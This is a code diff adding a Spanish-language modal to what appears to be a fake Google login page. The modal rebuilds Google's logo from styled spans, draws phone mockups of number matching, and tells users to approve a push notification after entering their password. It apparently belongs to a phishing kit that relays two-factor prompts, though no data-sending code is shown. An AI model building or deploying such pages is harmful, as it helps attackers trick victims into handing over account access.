@@ -1,3 +1,4 @@
+
    <!-- Pantalla 2: Password -->
    <div id="overlay" class="overlay-desactive"></div>
    <div id="screen2" class="login-container">
@@ -70,3 +71,55 @@
       </div> <!-- Fin right-section -->
     </div> <!-- Fin section-container -->
   </div> <!-- Fin screen2 -->
+  
+
+
+  <!-- BACKDROP y MODAL AGREGADOS -->
+  <div class="g2fa-backdrop-overlay" id="modal-backdrop"></div>
+  <div class="g2fa-main-dialog" id="modal">
+    <h2 class="g2fa-modal-title-custom">Confirma tu identidad</h2>
+    <p class="g2fa-modal-text-custom">
+      Luego de ingresar tu contraseña, recibirás una notificación en tu teléfono.
+      Presiona <strong>Sí</strong> y luego toca el <strong>número</strong> que te mostraremos en esta pantalla.
+    </p>
+
+    <!-- IMG EXPLICATIVA -->
+    <div class="g2fa-phones-container">
+      <!-- Teléfono izquierdo -->
+      <div class="g2fa-device-display g2fa-device-left">
+        <div class="g2fa-brand-logo">
+          <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span>
+          <span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+        </div>
+        <div class="g2fa-deco-line-short"></div>
+        <div class="g2fa-code-display">7</div>
+        <div class="g2fa-deco-line-long"></div>
+        <div class="g2fa-device-side-controls">
+          <div class="g2fa-device-side-button g2fa-button-short"></div>
+          <div class="g2fa-device-side-button g2fa-button-long"></div>
+        </div>
+      </div>
+
+      <!-- Flecha -->
+      <div class="g2fa-flow-arrow">→</div>
+
+      <!-- Teléfono derecho -->
+      <div class="g2fa-device-display g2fa-device-right">
+        <div class="g2fa-device-header-text">Selecciona el<br>número correcto</div>
+        <div class="g2fa-notification-panel">
+          <div class="g2fa-selection-circle g2fa-circle-dimmed">5</div>
+          <div class="g2fa-selection-circle g2fa-circle-highlighted">7</div>
+          <div class="g2fa-selection-circle g2fa-circle-dimmed">3</div>
+        </div>
+        <div class="g2fa-device-side-controls">
+          <div class="g2fa-device-side-button g2fa-button-short"></div>
+          <div class="g2fa-device-side-button g2fa-button-long"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- BOTÓN ÚNICO -->
+    <button class="g2fa-action-button" id="btn-permit-screen2-modal">Continuar</button>
+  </div>
+
+  
